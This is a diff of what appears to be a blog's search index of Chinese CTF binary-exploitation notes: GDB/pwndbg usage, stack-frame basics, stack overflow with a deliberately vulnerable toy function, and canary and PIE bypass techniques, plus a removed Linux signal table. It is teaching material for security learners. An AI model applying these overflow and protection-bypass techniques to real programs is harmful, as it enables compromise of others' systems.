@@ -294,81 +294,97 @@ shellcode变型这是最后一种类型的shellcode，和mrctf2020_shellcode类�
       </tags>
   </entry>
   <entry>
-    <title>GDB_PWNDBG调试</title>
-    <url>//docx/GDB_PWNDBG%E8%B0%83%E8%AF%95/</url>
-    <content><![CDATA[简介下载什么就不多说了，我们直接讲使用。
-GDB算是这个世界上最强的动态调试器了，而PWNDBG是GDB的一个插件，可以更好地展示GDB得到的一些内容，让我们方便理解。
-GDB可以使用的功能包括且不限于：
-运行
-步入、步过、步出、步止
-断点（设置、删除、显示）
-查看内存、寄存器、各种参数
-设置内存、寄存器、各种参数（加载文件）
-远程调试
-其他辅助功能
-当我们要调试某个程序的时候，要输入：
-&gt;gdb [文件名]
+    <title>02 栈溢出介绍及初级栈溢出</title>
+    <url>//docx/02%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%9D%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[栈溢出基础C语言函数调用栈函数调用栈函数调用栈是指程序运行时侯，内存的一段连续的区域。用来保护函数运行时候的状态信息（函数参数，局部变量等）。
+称之为“栈”的原因是因为发生函数调用时，调用函数_（caller）_的状态被保存在栈内，被调用函数（callee）的状态压入调用栈的栈顶。
+在函数调用结束的时候，栈顶的被调用函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。
+调用函数栈在内存中从高地址向低地址生长，所以栈顶对应内存地址在压栈时变小，退栈时候变大。
 
-当我们忘记命令的时候，可以输入：
-(gdb)/(pwndbg) help
+比如下面这个代码：
+#include&lt;stdio.h&gt;int main()&#123;    chat str[]=&quot;hello,world&quot;;    printf(&quot;%s&quot;,str);    return 0;&#125;
 
-以Intel方式查看汇编代码（似乎pwndbg默认Intel汇编代码格式）：
-(gdb)/(pwndbg) set disassembly-flavor intel
+其中，str被保存在main的函数栈区中，当我调用printf的时候，str便会放入到printf函数的栈区中。此时printf就是被调用函数callee，而caller就是调用函数main。
+栈帧结构就像我上面说的，每次使用某个函数的时候就会创造相对于的“调用函数的状态”或者“被调用函数的状态”。而这个栈的结构是怎么样的呢：
 
-上述的查看反汇编格式，可以通过修改.gdbinit来完成。
-vim ~/.gdbinit(vim) disassembly-flavor intel
+简单介绍一下，这边我们的从_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围内都是我们的被调用寄存器，而返回地址上面（向高地址）的参数则是前一个函数的参数，在前面是上一个函数的栈帧指针。所以一般而言，我们只要看_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围就行了。
+然后这张图是完全按照高地址到低地址（上到下）来呈现的。
+函数状态寄存器要表示一个函数此时此刻栈帧中的状态，主要涉及到三个寄存器：esp，ebp和eip。（在64位架构下这些指针应该叫做rsp,rbp和rip)（下边大部分时候都拿32位的称呼去做操作演示）
+**EIP RIP：**全称叫做_指令指针（Instruction Pointer, IP）_，它用于存储吓一跳将被执行的指令在代码段中的偏移地址。CPU通过EIP寄存器来确定从内存中的哪一个位置来读取下一条指令。当我运行printf(“Helloworld”)的时候，eip会先指向指令mov rdi, [Helloworld字符串地址]，然后再指向call printf这个指令。这两条指令构成了在某一函数内输出Helloworld的方式。
+**ESP RSP：**全称叫做_栈指针（Extended Stack Pointer，SP，又叫做栈顶指针）_，栈遵循先进后出原则。ESP指针一般指向栈顶，当有值被压入栈的时候，栈顶指针就会根据被压入栈中参数的长短做偏移形成存有新值的ESP指针。简而言之，不管栈如何变化，ESP寄存器一般而言都会存有当前栈顶地址的状态。
+EBP RBP：全称叫做_基址指针（Base Pointer，BP，又叫做栈底指针），_当栈被创建的时候，EBP就指向栈的最低端，此时EBP==ESP，随后当栈发生变化（有数据压入或者弹出），ESP在变化的时候，EBP还是存有栈底的地址，不会变化。简而言之，不管栈如何变化，EBP寄存器一般而言都会存有当前函数栈底地址的状态。
+函数栈形成与状态首先将被调用函数callee的参数按照逆序依次压入栈内。如果callee不需要参数，则没有这一步骤。这些参数仍会保存在caller的函数状态内。之后压入栈内的数据就会作为callee的函数状态保存，如下图所示：
 
-接下来 我们一点一点开始讲。
-程序执行与控制执行程序及设置管理断点当我们要执行一个程序的时候，我们需要输入run（简写r）或者start
-(gdb)/(pwndbg) run		#程序直接跑一边，如果有断点进入断点处(gdb)/(pwndbg) r			#同上(gdb)/(pwndbg) start	#从gdb认为的入口点开始步入运行
+将被调用函数(Callee)的参数压入栈中1
+然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入返回地址压入栈内。这样caller的eip信息就得以保存了，如下图所示：
 
-在这之后，我们一般而言会设置断点（break，简写b）来方便调试程序：
-(gdb)/(pwndbg) b main(gdb)/(pwndbg) break main(gdb)/(pwndbg) b *0x000000FF	#这是一个地址
+将被调用函数(Callee)的参数压入栈中2
+再将当前的ebp寄存器的值（也就是caller的基地址）压入栈内，并将ebp寄存器的值更新位当前栈顶的地址。这样调用函数caller的ebp信息得以保存，同时，ebp被更新为callee的基地址，如下图所示：
 
-b是用来断点的，或者说是标记断点且默认处于启动状态。我们也可以用disable或者dis、disa来禁用全部断点或者部分断点。启用断点则是enable或者en。而当某个断点不需要的时候，我们可以使用delete或者d来删除断点。其中每个断点都会有一个b_id号码。不过删除和禁用分别有两种语法需要注意：
-(gdb)/(pwndbg) d id			#删除某id的断点(gdb)/(pwndbg) d 1			#删除id为1的断点(gdb)/(pwndbg) dis b id	#禁用某id的断点(gdb)/(pwndbg) dis b 1	#禁用id为1的断点(gdb)/(pwndbg) en b id	#启用某id的断点(gdb)/(pwndbg) en b 1		#启用id为1的断点
+将caller的ebp压入栈内，并将当前栈顶地址传入ebp中
+在压栈的过程中，esp的寄存器的值不断变小（对应栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的及地址、局部变量这些参数的状态。其中调用参数以外的数据共同构成了被调用函数callee的状态。
+在发生调用时候，程序还会将callee的指令地址存到eip寄存器内，这样程序就可以依次执行callee的指令了。
+最后将被调用函数(callee)的局部变量压入栈内，如下图所示：
 
-其实pwn方向一般不会设置太多断点啥的。不过逆向倒是要学这些。
-如果想是一些开有PIE的保护的话，我们则需要一个*$rebase(偏移量)函数了。例如：
-b *$rebase(0x0f0)
+将caller的ebp压入栈内，并将当前栈顶地址传入ebp中
+看过了函数调用发生时的情况，就不难理解函数调用结束时候的变化。变化的和性就是丢弃callee的状态，将栈顶恢复成caller的状态。首先callee的局部变量会先从栈内直接弹出，栈顶会指向callee的基地址。
+然后将基地址的内储存调用函数caller的基地址从栈内弹出，并且存到ebp寄存器中，这样caller的ebp信息得以恢复。此时栈顶会指向返回地址。
+最后将返回地址pop到eip中，随后esp再向上一格，回到caller的栈顶位置，ebp保持不变。如下图所示：
 
-步操作int sum(int a,int b)&#123;    int sumnum = a + b;    return sum_num;&#125;int main()&#123;    int a;    printf(&quot;1+2=&quot;);    a = sum(1,2);    printf(&quot;%d&quot;,a);    return 0;&#125;
+栈溢出（stack overflow）栈溢出原理讲完上面的基础知识，我们可以理解：当函数正在执行内部指令的过程中，我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用的时候，程序的控制权会在函数状态之间发生跳转，这时我们可以通过修改函数状态（修改返回地址）来实现攻击。而控制程序执行指令最关键的寄存器就是eip，所以我们的目标就是让rip载入攻击指令的地址。 
+:::info缓冲区溢出（Buffer overflow）
+编写程序的时候没有考虑到或者错误的控制用户输入的长度，本质就是向定长的缓冲区中写入了超长的数据，造成超出的数据覆写了合法内存区域。
+栈溢出（Stack overflow）：最常见、漏洞比例最高、危害最大的二进制漏洞。在CTF PWN中往往是漏洞利用的基础。
+堆溢出（Heap overflow）：关系到堆管理器系统，比较复杂，利用花样多。CTF PWN中的常见题型
+Data段溢出：比如.bss段，修改关键变量，比较少见。攻击效果依赖于Data段上存放了何种控制数据。
+:::
+栈溢出的基本利用如果说有这么一个函数（32位）：
+int overflow()&#123;    char buf[8];    read(0, buf, 16);    return 0;&#125;
 
-在上面这个代码里面，我们可以用GDB做一些基础的程序运行操作：
-步入（**step**** 简写为****s****）：**用于单步执行程序，当遇到函数调用时，会进入该函数内部，逐行执行函数的实现代码。当我运行到第 6 行的 printf 的时候，步入会进入 printf 函数中，一步步走过 printf 函数的实现代码。
-步过（**next**** 简写为****n****）：**同样是单步执行，但遇到函数调用时，不会进入函数内部，而是直接执行完该函数后，进入下一行代码等待执行。当我运行到第 7 行的 printf 的时候，步过会不管 printf 函数里面如何如何，直接运行完 printf 函数进入到第 8 行 sum 函数待执行。
-s和n都可以在后面加一个&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;instruction&lt;/font&gt;参数，大概使用方法就是&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;si&lt;/font&gt;和&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;ni&lt;/font&gt;：
-&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;si&lt;/font&gt;（step instruction）：执行下一步汇编指令，会进入汇编或 C 函数内部，无论函数是否有调试信息。
-&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;ni&lt;/font&gt;（next instruction）：执行下一步汇编指令，不会进入任何函数内部，直接执行完当前汇编指令并停在下一条。
-简单来说，&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;s/n&lt;/font&gt;适用于 C 代码层面的调试，&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;si/ni&lt;/font&gt;适用于更底层的汇编层面调试，核心区别在于是否进入函数、以及进入后的定位级别（C 级 vs 汇编级）。上面两个指令，一般情况下都会用n和ni。
-步出（**finish**** 简写为****fin****）：**适用于已进入某个函数内部，希望快速结束该函数的执行，直接返回到调用该函数的下一行代码。当我从第八行步入到 sum 函数之后，我感觉 sum 函数不需要看，想要直接从 sum 函数回到 main 函数的时候，步出可以快速运行完 sum 函数回到 main 函数的第九行待执行。
-步止（**continue**&#x2F;**until**** 简写为****c**&#x2F;**u 行号****）：**用于让程序持续运行，执行到断点停止。如果我想运行到第 10 行等待，那么我可以设置一个断点在第十行，这样执行步止操作的时候我就可以直接运行到第十行。
-数据查看与修改寄存器数据与汇编代码查看在指令里面，分为_操作符号_和_被操作的对象_。例如下面的：
-查看（info 简写为i）：用于查看对象的值。例如查看断点则是i b
-寄存器（registers 简写为r）：一种被查看的对象。例如查看寄存器的值可以是i r
-例如查看寄存器的值可以写成(gdb)(pwndbg) i r
-反汇编（disassemble 函数名/$寄存器名(eip/rip)）：将某一段函数或者rip&#x2F;eip指针附近的机器码反编译为汇编。也是一种操作。
-(gdb)/(pwndbg) disassemble main(gdb)/(pwndbg) disassemble $rip
+当我调用这个函数的时候，函数将初始化esp和ebp寄存器，且将eip指针指向这个代码中。而下面这张图的左边就是overflow的栈帧视图，右边则为我输入AAAABBBBCCCCDDDD之后栈帧中实际的值存储情况。
 
-内存数据查看除了上面的i r，我还可以通过print（缩写为p）来查看寄存器的位置（也就是此寄存器的地址），例如p eax
-如果我要看地址的话，就要用x指令来查询。
-例如有一个movzx eax,BYTE PTR[rbp-0x20]的操作，我现在想要查询rbp-0x20这个地址里面的值，就可以用：x/20b $rbp-0x20的方式。这样就是一个byte一个byte的查询20个byte。其中语法是这样的：
-x/[查询行数][以多少位输出][显示格式] [查询的地址]
+我们会发现当我们输入这么多东西之后，return address就被篡改成了’DDDD’所表示的地址，也就是0x44444444。而此时此刻也会出现一个问题：那就程序中没有0x44444444这个地址。
+所以如果我们一旦把DDDD这一块的内容改成某个具体的地址化，实际上就会跳转到这个地址，并且运行这个地址里面的内容了。也就是——篡改栈帧上的返回地址，为程序中已有的函数。
+学完上面的内容，我们可以配合一套例题来食用：overflow_ez_32
+Canary_pie绕过canary机制canary原理canary是一个用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs&#x2F;gs寄存器中取出一个四字节或者八字节（取决于系统架构是32还是64）的值存到栈上去。当函数结束时会检查这个栈上的值是否和一开始存进去的值一样。程序每次运行的时候，canary的值都会不一样。对于我们而言，canary的值几乎是一个随机值。我们无法知道值是多少。
+像我们上面举例的例子，再有canary的情况下就会变成这样：
 
-如此这般的有：
-x/20gx（64 位十六进制，显示 20 项）x/20wx（32 位）x/20bx（8 位）x/20bx（字符串显示）x/20ix（反汇编指令显示）
-内存数据修改如果我要修改这里的值，那么就用set指令，其中语法为：
-set ([地址值])=[修改值]	#这个地址值外面的的括号必须有
+如果像这样，我们将Canary篡改之后，就会触发`__Stack_chk_fail`这个函数，并且会报错。
 
-例如set (rbp - 0x10) = 41
-如此这般的有：
-set *0x7ffffffe050=19（改写内存值）set $rax=19（改写寄存器值）set(char [4])0x80477a4 = &quot;Ace&quot;（改写内存字符串）
-远程调试]]></content>
+不过就像上面所说，如果我们知道canary的值是多少，那么我们便可以在栈溢出的时候保留canary的值，且就可以成功溢出了。
+:::info说起来我也是无聊，当时学canary的时候，很好奇这个翻译过来叫做“金丝雀”的东西为什么会是一种保护机制。
+这个名字非常有趣，他和我们的近代工业史有关——19世纪时候的煤矿工人下井挖矿的时候，会带着一只金丝雀。矿井里面会有一些无色无味的有毒气体，像是一氧化碳，人类要吸入一定剂量才会出现问题，而且那个时候已经逃不掉了。不过金丝雀这种小动物容易出现明显反应。矿工们通过观察金丝雀的状态，就能提前察觉危险，及时撤离。
+还有一种说法是（我觉得两种都有），矿工下矿前会把金丝雀先拿绳子下放到矿井中，过一会儿再拿上来查看反应。这个就很像栈溢出的时候canary先放入栈中试探，等到函数运行结束的时候再拿上来对比值一样了。
+canary保护顾名思义，和金丝雀一样脆弱。每当一次canary绕过失败的时候，你可以理解为计算机里面死了一只电子金丝雀（难崩）。
+:::
+canary绕过方法如此，其实绕过canary的最重要的一步就是如何获取canary的值，canary绕过大概有以下几种绕过方式：
+**1、格式化字符串绕过canary：**通过格式化字符串读取canary的值
+**2、canary爆破（针对有fork的程序）：**我在pwn及计算机原理基础知识这里说明了fork函数的具体作用。fork函数相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary的值也是一样的。所以可以通过这个机制堆canary逐位爆破，如果程序崩溃了就说明这一位不对。如果程序可以正常那就接着跑下一位，直到跑出正确的canary。
+3、Stack samashing（故意触发**canary_spp leak**）
+**4、劫持__stack_chk_fail：**修改got表中__stack_chk_fail函数的地址，在栈溢出后执行该函数，不过因为我们修改了__stack_chk_fail函数所指向的地址，程序运行__stack_chk_fail的时候就会跳转到我们当时修改的地址。
+格式化字符串绕过canary（我懒得画图了，这一块我就用Excel来画图演示，会比较方便）
+有关格式化字符串的介绍可以去看暗线中的：01 格式化字符串，稍微学一点即可，现在全学完学不明白。
+假设有一个%s这样的格式化字符串，如果我们把输入的内容和canary连在一起，那么在用%s这种格式化字符串输出的时候就会将canary一起打印出来。
+需要注意的是，canary的最后一位一定是’\0’，用于放置连带输出，所以我们改的时候，要把canary的最后一位也改了（其实理解成“最前面一位是’\0’”会比较合适，因为这里的，所谓“最后一位”实际上是小端序）。
+
+例题：
+PIE机制原理PIE技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护，那么在每次加载程序时都会变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。
+在一个开启PIE保护的程序中，所有代码段的地址都只有最后三个数字是已知的：
+
+这些数字分别是这一行数据相对于基地址的偏移量。
+还有一点需要强调的是，程序的加载地址一般都是以内存页为单位的，所以程序的基地址的最后三个数字一定是0，也就是说我们看到的这些所谓的**“偏移量”就是内存中实际地址的最后三位数**。
+所以，虽然我不知道完整的地址，但我知道最后的三个数，那么我就可以利用栈上已有的地址，只修改他们的最后两个字节（最后四位数）即可。
+所以对于绕过PIE保护的核心思想就是**partial writing（部分地址改写）**
+例题：
+所以这种方法，从某种意义上按照道理每次爆破都只有1&#x2F;16的概率能进。
+还有泄露基地址。
+]]></content>
       <categories>
         <category>PWN不出来</category>
       </categories>
       <tags>
-        <tag>PWN的工具笔记</tag>
+        <tag>PWN攻略-主线</tag>
+        <tag>shellcode</tag>
       </tags>
   </entry>
   <entry>
@@ -524,347 +540,6 @@ $ \frac{dS}{dk} &#x3D; \frac{\alpha}{k^2 \cdot \left[(1 - \alpha) + \frac{\alpha
       </categories>
       <tags>
         <tag>计算机原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>02 栈溢出介绍及初级栈溢出</title>
-    <url>//docx/02%20%E6%A0%88%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%9D%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
-    <content><![CDATA[栈溢出基础C语言函数调用栈函数调用栈函数调用栈是指程序运行时侯，内存的一段连续的区域。用来保护函数运行时候的状态信息（函数参数，局部变量等）。
-称之为“栈”的原因是因为发生函数调用时，调用函数_（caller）_的状态被保存在栈内，被调用函数（callee）的状态压入调用栈的栈顶。
-在函数调用结束的时候，栈顶的被调用函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。
-调用函数栈在内存中从高地址向低地址生长，所以栈顶对应内存地址在压栈时变小，退栈时候变大。
-
-比如下面这个代码：
-#include&lt;stdio.h&gt;int main()&#123;    chat str[]=&quot;hello,world&quot;;    printf(&quot;%s&quot;,str);    return 0;&#125;
-
-其中，str被保存在main的函数栈区中，当我调用printf的时候，str便会放入到printf函数的栈区中。此时printf就是被调用函数callee，而caller就是调用函数main。
-栈帧结构就像我上面说的，每次使用某个函数的时候就会创造相对于的“调用函数的状态”或者“被调用函数的状态”。而这个栈的结构是怎么样的呢：
-
-简单介绍一下，这边我们的从_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围内都是我们的被调用寄存器，而返回地址上面（向高地址）的参数则是前一个函数的参数，在前面是上一个函数的栈帧指针。所以一般而言，我们只要看_局部变量(Local variables)_到_栈帧指针(stack frame pointer)_的范围就行了。
-然后这张图是完全按照高地址到低地址（上到下）来呈现的。
-函数状态寄存器要表示一个函数此时此刻栈帧中的状态，主要涉及到三个寄存器：esp，ebp和eip。（在64位架构下这些指针应该叫做rsp,rbp和rip)（下边大部分时候都拿32位的称呼去做操作演示）
-**EIP RIP：**全称叫做_指令指针（Instruction Pointer, IP）_，它用于存储吓一跳将被执行的指令在代码段中的偏移地址。CPU通过EIP寄存器来确定从内存中的哪一个位置来读取下一条指令。当我运行printf(“Helloworld”)的时候，eip会先指向指令mov rdi, [Helloworld字符串地址]，然后再指向call printf这个指令。这两条指令构成了在某一函数内输出Helloworld的方式。
-**ESP RSP：**全称叫做_栈指针（Extended Stack Pointer，SP，又叫做栈顶指针）_，栈遵循先进后出原则。ESP指针一般指向栈顶，当有值被压入栈的时候，栈顶指针就会根据被压入栈中参数的长短做偏移形成存有新值的ESP指针。简而言之，不管栈如何变化，ESP寄存器一般而言都会存有当前栈顶地址的状态。
-EBP RBP：全称叫做_基址指针（Base Pointer，BP，又叫做栈底指针），_当栈被创建的时候，EBP就指向栈的最低端，此时EBP==ESP，随后当栈发生变化（有数据压入或者弹出），ESP在变化的时候，EBP还是存有栈底的地址，不会变化。简而言之，不管栈如何变化，EBP寄存器一般而言都会存有当前函数栈底地址的状态。
-函数栈形成与状态首先将被调用函数callee的参数按照逆序依次压入栈内。如果callee不需要参数，则没有这一步骤。这些参数仍会保存在caller的函数状态内。之后压入栈内的数据就会作为callee的函数状态保存，如下图所示：
-
-将被调用函数(Callee)的参数压入栈中1
-然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入返回地址压入栈内。这样caller的eip信息就得以保存了，如下图所示：
-
-将被调用函数(Callee)的参数压入栈中2
-再将当前的ebp寄存器的值（也就是caller的基地址）压入栈内，并将ebp寄存器的值更新位当前栈顶的地址。这样调用函数caller的ebp信息得以保存，同时，ebp被更新为callee的基地址，如下图所示：
-
-将caller的ebp压入栈内，并将当前栈顶地址传入ebp中
-在压栈的过程中，esp的寄存器的值不断变小（对应栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的及地址、局部变量这些参数的状态。其中调用参数以外的数据共同构成了被调用函数callee的状态。
-在发生调用时候，程序还会将callee的指令地址存到eip寄存器内，这样程序就可以依次执行callee的指令了。
-最后将被调用函数(callee)的局部变量压入栈内，如下图所示：
-
-将caller的ebp压入栈内，并将当前栈顶地址传入ebp中
-看过了函数调用发生时的情况，就不难理解函数调用结束时候的变化。变化的和性就是丢弃callee的状态，将栈顶恢复成caller的状态。首先callee的局部变量会先从栈内直接弹出，栈顶会指向callee的基地址。
-然后将基地址的内储存调用函数caller的基地址从栈内弹出，并且存到ebp寄存器中，这样caller的ebp信息得以恢复。此时栈顶会指向返回地址。
-最后将返回地址pop到eip中，随后esp再向上一格，回到caller的栈顶位置，ebp保持不变。如下图所示：
-
-栈溢出（stack overflow）栈溢出原理讲完上面的基础知识，我们可以理解：当函数正在执行内部指令的过程中，我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用的时候，程序的控制权会在函数状态之间发生跳转，这时我们可以通过修改函数状态（修改返回地址）来实现攻击。而控制程序执行指令最关键的寄存器就是eip，所以我们的目标就是让rip载入攻击指令的地址。 
-:::info缓冲区溢出（Buffer overflow）
-编写程序的时候没有考虑到或者错误的控制用户输入的长度，本质就是向定长的缓冲区中写入了超长的数据，造成超出的数据覆写了合法内存区域。
-栈溢出（Stack overflow）：最常见、漏洞比例最高、危害最大的二进制漏洞。在CTF PWN中往往是漏洞利用的基础。
-堆溢出（Heap overflow）：关系到堆管理器系统，比较复杂，利用花样多。CTF PWN中的常见题型
-Data段溢出：比如.bss段，修改关键变量，比较少见。攻击效果依赖于Data段上存放了何种控制数据。
-:::
-栈溢出的基本利用如果说有这么一个函数（32位）：
-int overflow()&#123;    char buf[8];    read(0, buf, 16);    return 0;&#125;
-
-当我调用这个函数的时候，函数将初始化esp和ebp寄存器，且将eip指针指向这个代码中。而下面这张图的左边就是overflow的栈帧视图，右边则为我输入AAAABBBBCCCCDDDD之后栈帧中实际的值存储情况。
-
-我们会发现当我们输入这么多东西之后，return address就被篡改成了’DDDD’所表示的地址，也就是0x44444444。而此时此刻也会出现一个问题：那就程序中没有0x44444444这个地址。
-所以如果我们一旦把DDDD这一块的内容改成某个具体的地址化，实际上就会跳转到这个地址，并且运行这个地址里面的内容了。也就是——篡改栈帧上的返回地址，为程序中已有的函数。
-学完上面的内容，我们可以配合一套例题来食用：overflow_ez_32
-Canary_pie绕过canary机制canary原理canary是一个用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs&#x2F;gs寄存器中取出一个四字节或者八字节（取决于系统架构是32还是64）的值存到栈上去。当函数结束时会检查这个栈上的值是否和一开始存进去的值一样。程序每次运行的时候，canary的值都会不一样。对于我们而言，canary的值几乎是一个随机值。我们无法知道值是多少。
-像我们上面举例的例子，再有canary的情况下就会变成这样：
-
-如果像这样，我们将Canary篡改之后，就会触发`__Stack_chk_fail`这个函数，并且会报错。
-
-不过就像上面所说，如果我们知道canary的值是多少，那么我们便可以在栈溢出的时候保留canary的值，且就可以成功溢出了。
-:::info说起来我也是无聊，当时学canary的时候，很好奇这个翻译过来叫做“金丝雀”的东西为什么会是一种保护机制。
-这个名字非常有趣，他和我们的近代工业史有关——19世纪时候的煤矿工人下井挖矿的时候，会带着一只金丝雀。矿井里面会有一些无色无味的有毒气体，像是一氧化碳，人类要吸入一定剂量才会出现问题，而且那个时候已经逃不掉了。不过金丝雀这种小动物容易出现明显反应。矿工们通过观察金丝雀的状态，就能提前察觉危险，及时撤离。
-还有一种说法是（我觉得两种都有），矿工下矿前会把金丝雀先拿绳子下放到矿井中，过一会儿再拿上来查看反应。这个就很像栈溢出的时候canary先放入栈中试探，等到函数运行结束的时候再拿上来对比值一样了。
-canary保护顾名思义，和金丝雀一样脆弱。每当一次canary绕过失败的时候，你可以理解为计算机里面死了一只电子金丝雀（难崩）。
-:::
-canary绕过方法如此，其实绕过canary的最重要的一步就是如何获取canary的值，canary绕过大概有以下几种绕过方式：
-**1、格式化字符串绕过canary：**通过格式化字符串读取canary的值
-**2、canary爆破（针对有fork的程序）：**我在pwn及计算机原理基础知识这里说明了fork函数的具体作用。fork函数相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary的值也是一样的。所以可以通过这个机制堆canary逐位爆破，如果程序崩溃了就说明这一位不对。如果程序可以正常那就接着跑下一位，直到跑出正确的canary。
-3、Stack samashing（故意触发**canary_spp leak**）
-**4、劫持__stack_chk_fail：**修改got表中__stack_chk_fail函数的地址，在栈溢出后执行该函数，不过因为我们修改了__stack_chk_fail函数所指向的地址，程序运行__stack_chk_fail的时候就会跳转到我们当时修改的地址。
-格式化字符串绕过canary（我懒得画图了，这一块我就用Excel来画图演示，会比较方便）
-有关格式化字符串的介绍可以去看暗线中的：01 格式化字符串，稍微学一点即可，现在全学完学不明白。
-假设有一个%s这样的格式化字符串，如果我们把输入的内容和canary连在一起，那么在用%s这种格式化字符串输出的时候就会将canary一起打印出来。
-需要注意的是，canary的最后一位一定是’\0’，用于放置连带输出，所以我们改的时候，要把canary的最后一位也改了（其实理解成“最前面一位是’\0’”会比较合适，因为这里的，所谓“最后一位”实际上是小端序）。
-
-例题：
-PIE机制原理PIE技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护，那么在每次加载程序时都会变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。
-在一个开启PIE保护的程序中，所有代码段的地址都只有最后三个数字是已知的：
-
-这些数字分别是这一行数据相对于基地址的偏移量。
-还有一点需要强调的是，程序的加载地址一般都是以内存页为单位的，所以程序的基地址的最后三个数字一定是0，也就是说我们看到的这些所谓的**“偏移量”就是内存中实际地址的最后三位数**。
-所以，虽然我不知道完整的地址，但我知道最后的三个数，那么我就可以利用栈上已有的地址，只修改他们的最后两个字节（最后四位数）即可。
-所以对于绕过PIE保护的核心思想就是**partial writing（部分地址改写）**
-例题：
-所以这种方法，从某种意义上按照道理每次爆破都只有1&#x2F;16的概率能进。
-还有泄露基地址。
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN攻略-主线</tag>
-        <tag>shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux退出状态码</title>
-    <url>//docx/Linux%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81%E7%A0%81/</url>
-    <content><![CDATA[
-
-
-信号编号
-信号名称
-信号描述
-默认处理方式
-Exit code
-
-
-
-1.
-SIGHUP
-挂起
-终止
-1.
-
-
-2.
-SIGINT
-终端中断
-终止
-2.
-
-
-3.
-SIGQUIT
-终端退出
-终止、core dump
-131.
-
-
-4.
-SIGILL
-非法指令
-终止、core dump
-132.
-
-
-5.
-SIGTRAP
-跟踪 &#x2F; 断点陷阱
-终止、core dump
-133.
-
-
-6.
-SIGABRT
-终止进程
-终止、core dump
-134.
-
-
-7.
-SIGBUS
-Bus error
-终止、core dump
-135.
-
-
-8.
-SIGFPE
-算术异常
-终止、core dump
-136.
-
-
-9.
-SIGKILL
-杀死进程（必杀）
-终止
-9.
-
-
-10.
-SIGUSR1
-用户自定义信号 1
-终止
-10.
-
-
-11.
-SIGSEGV
-段错误
-终止、core dump
-139.
-
-
-12.
-SIGUSR2
-用户自定义信号 2
-终止
-12.
-
-
-13.
-SIGPIPE
-管道断开
-终止
-13.
-
-
-14.
-SIGALRM
-定时器信号
-终止
-14.
-
-
-15.
-SIGTERM
-终止进程
-终止
-15.
-
-
-16.
-SIGSTKFLT
-栈错误
-终止
-16.
-
-
-17.
-SIGCHLD
-子进程退出
-忽略
-无
-
-
-18.
-SIGCONT
-继续执行
-若停止则继续执行
-无
-
-
-19.
-SIGSTOP
-停止执行（必停）
-暂停执行
-无
-
-
-20.
-SIGTSTP
-停止
-暂停执行
-无
-
-
-21.
-SIGTTIN
-Stopped (tty input)
-暂停执行
-无
-
-
-22.
-SIGTTOU
-Stopped (tty output)
-暂停执行
-无
-
-
-23.
-SIGURG
-IO 紧急数据
-忽略
-无
-
-
-24.
-SIGXCPU
-突破对 cpu 时间的限制
-终止、core dump
-152.
-
-
-25.
-SIGXFSZ
-突破对文件大小的限制
-终止、core dump
-153.
-
-
-26.
-SIGVTALRM
-虚拟定时器超时
-终止
-26.
-
-
-27.
-SIGPROF
-性能分析定时器超时
-终止
-27.
-
-
-28.
-SIGWINCH
-终端窗口尺寸发生变化
-忽略
-无
-
-
-29.
-SIGIO
-IO 时可能产生
-终止
-29.
-
-
-30.
-SIGPWR
-电量行将耗尽
-终止
-30.
-
-
-31.
-SIGSYS
-错误的系统调用
-终止、core dump
-159.
-
-
-34~64
-SIGRTMIN~SIGRTMAX
-实时信号
-
-
-
-
-]]></content>
-      <categories>
-        <category>PWN不出来</category>
-      </categories>
-      <tags>
-        <tag>PWN攻略-所需表格</tag>
-        <tag>计算机原理相关表格</tag>
       </tags>
   </entry>
   <entry>
@@ -1916,6 +1591,331 @@ DEL (Delete)
       </tags>
   </entry>
   <entry>
+    <title>GDB_PWNDBG调试</title>
+    <url>//docx/GDB_PWNDBG%E8%B0%83%E8%AF%95/</url>
+    <content><![CDATA[简介下载什么就不多说了，我们直接讲使用。
+GDB算是这个世界上最强的动态调试器了，而PWNDBG是GDB的一个插件，可以更好地展示GDB得到的一些内容，让我们方便理解。
+GDB可以使用的功能包括且不限于：
+运行
+步入、步过、步出、步止
+断点（设置、删除、显示）
+查看内存、寄存器、各种参数
+设置内存、寄存器、各种参数（加载文件）
+远程调试
+其他辅助功能
+当我们要调试某个程序的时候，要输入：
+&gt;gdb [文件名]
+
+当我们忘记命令的时候，可以输入：
+(gdb)/(pwndbg) help
+
